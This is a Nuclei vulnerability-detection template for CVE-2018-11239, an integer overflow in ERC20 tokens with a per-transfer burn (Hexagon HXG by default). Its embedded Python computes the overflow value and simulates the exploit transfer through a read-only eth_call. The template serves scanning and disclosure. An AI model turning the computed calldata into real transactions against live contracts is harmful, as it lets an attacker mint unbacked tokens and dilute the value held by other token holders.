id: CVE-2018-11239

info:
  name: Hexagon Token - burnOverflow Integer Overflow
  author: KrE80r
  severity: high
  description: |
    Integer overflow vulnerability in ERC20 tokens with burnPerTransaction mechanism. The vulnerability exists in the _transfer function where `_value + burnPerTransaction` can overflow to zero, bypassing balance checks. This template SIMULATES the actual exploit via eth_call to PROVE vulnerability exists.
  impact: |
    Attackers can mint unlimited tokens without spending any, effectively stealing value from all token holders through dilution. The Hexagon (HXG) token was exploited using this vulnerability on May 18, 2018.
  remediation: |
    Use SafeMath library for all arithmetic operations or upgrade to Solidity 0.8.0+ which has built-in overflow checks.
  reference:
    - https://nvd.nist.gov/vuln/detail/CVE-2018-11239
    - https://peckshield.com/2018/05/18/burnOverflow/
    - https://peckshield.medium.com/new-burnoverflow-bug-identified-in-multiple-erc20-smart-contracts-cve-2018-11239-52cc4f821694
    - https://etherscan.io/address/0xB5335e24d0aB29C190AB8C2B459238Da1153cEBA
  classification:
    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:N
    cvss-score: 7.5
    cve-id: CVE-2018-11239
    cwe-id: CWE-190
  metadata:
    verified: true
    max-request: 3
    vendor: hexagontoken
    product: hexagon
  tags: cve,cve2018,ethereum,erc20,overflow,blockchain,smartcontract,code

# Usage:
#   Default (Hexagon HXG): nuclei -t CVE-2018-11239.yaml -u https://eth.llamarpc.com -code
#   Custom contract:       nuclei -t CVE-2018-11239.yaml -u https://eth.llamarpc.com -var contract=0xYOUR_CONTRACT -code

code:
  - engine:
      - py
      - python3
    source: |
      import os
      import json
      import urllib.request

      # Default to Hexagon HXG (known exploited contract)
      DEFAULT_CONTRACT = "0xB5335e24d0aB29C190AB8C2B459238Da1153cEBA"
      CONTRACT = os.getenv("contract", DEFAULT_CONTRACT)

      # RPC endpoint from nuclei target
      RPC_URL = os.getenv("Hostname", "https://eth.llamarpc.com")
      if not RPC_URL.startswith("http"):
          RPC_URL = "https://" + RPC_URL

      # Function selectors
      BURN_SELECTOR = "0x27edf097"      # burnPerTransaction()
      TRANSFER_SELECTOR = "0xa9059cbb"  # transfer(address,uint256)
      NAME_SELECTOR = "0x06fdde03"      # name()
      SYMBOL_SELECTOR = "0x95d89b41"    # symbol()

      def eth_call(to, data, from_addr=None):
          """Make eth_call to contract"""
          params = {"to": to, "data": data}
          if from_addr:
              params["from"] = from_addr

          payload = json.dumps({
              "jsonrpc": "2.0",
              "method": "eth_call",
              "params": [params, "latest"],
              "id": 1
          }).encode()

          req = urllib.request.Request(RPC_URL, data=payload, headers={"Content-Type": "application/json"})
          try:
              with urllib.request.urlopen(req, timeout=15) as response:
                  result = json.loads(response.read())
                  if "error" in result:
                      return None
                  return result.get("result", "0x")
          except Exception:
              return None

      def decode_uint(hex_result):
          """Decode uint256 from hex"""
          if not hex_result or hex_result == "0x":
              return None
          try:
              return int(hex_result, 16)
          except:
              return None

      def decode_string(hex_result):
          """Decode ABI-encoded string"""
          if not hex_result or hex_result == "0x" or len(hex_result) < 130:
              return ""
          try:
              data = bytes.fromhex(hex_result[2:])
              length = int.from_bytes(data[32:64], 'big')
              if length > 100:
                  return ""
              return data[64:64+length].decode('utf-8', errors='ignore')
          except:
              return ""

      def build_transfer_calldata(to_addr, value):
          """Build transfer(address,uint256) calldata"""
          # Pad address to 32 bytes
          to_padded = to_addr[2:].zfill(64) if to_addr.startswith("0x") else to_addr.zfill(64)
          # Value as 32 bytes hex
          value_hex = hex(value)[2:].zfill(64)
          return TRANSFER_SELECTOR + to_padded + value_hex

      # === MAIN DETECTION LOGIC ===
      try:
          # Step 1: Query burnPerTransaction()
          burn_result = eth_call(CONTRACT, BURN_SELECTOR)
          burn_value = decode_uint(burn_result)

          if burn_value is None:
              print(f"NOT VULNERABLE: Contract {CONTRACT} does not have burnPerTransaction()")
              exit(0)

          if burn_value == 0:
              print(f"NOT VULNERABLE: Contract {CONTRACT} has burnPerTransaction=0 (no overflow possible)")
              exit(0)

          # Step 2: Calculate overflow value dynamically
          # overflow_value + burn_value = 2^256 = 0 (overflow)
          MAX_UINT256 = 2**256 - 1
          overflow_value = MAX_UINT256 - burn_value + 1  # This + burn_value = 2^256 = 0

          # Step 3: SIMULATE THE EXPLOIT via eth_call
          # Call transfer(address(1), overflow_value) from address(2)
          # If this SUCCEEDS, the overflow bypassed the balance check
          exploit_calldata = build_transfer_calldata("0x0000000000000000000000000000000000000001", overflow_value)
          exploit_result = eth_call(CONTRACT, exploit_calldata, from_addr="0x0000000000000000000000000000000000000002")

          # Check if exploit simulation succeeded
          exploit_success = exploit_result is not None and decode_uint(exploit_result) == 1

          if not exploit_success:
              print(f"NOT VULNERABLE: Contract {CONTRACT} has burnPerTransaction={burn_value} but exploit simulation failed")
              print("  This means SafeMath or Solidity 0.8+ protection exists")
              exit(0)

          # Step 4: VULNERABLE - Exploit simulation succeeded!
          name = decode_string(eth_call(CONTRACT, NAME_SELECTOR))
          symbol = decode_string(eth_call(CONTRACT, SYMBOL_SELECTOR))

          print("VULNERABLE: CVE-2018-11239 burnOverflow PROVEN!")
          print(f"Contract: {CONTRACT}")
          print(f"Name: {name if name else 'Unknown'}")
          print(f"Symbol: {symbol if symbol else 'Unknown'}")
          print(f"burnPerTransaction: {burn_value}")
          print(f"Exploit simulation: SUCCEEDED")
          print()
          print("Proof of Exploitation:")
          print(f"  1. burnPerTransaction() = {burn_value}")
          print(f"  2. Calculated overflow value = 2^256 - {burn_value}")
          print(f"  3. Simulated transfer() with overflow value")
          print(f"  4. eth_call returned TRUE - balance check BYPASSED!")
          print()
          print("Impact: Attacker can mint unlimited tokens")
          print("Reference: https://peckshield.com/2018/05/18/burnOverflow/")

      except Exception as e:
          print(f"ERROR: {str(e)}")

    matchers:
      - type: word
        words:
          - "VULNERABLE: CVE-2018-11239 burnOverflow PROVEN!"

    extractors:
      - type: regex
        regex:
          - "Contract: (0x[a-fA-F0-9]{40})"
          - "Symbol: ([A-Z0-9]+)"
          - "burnPerTransaction: ([0-9]+)"
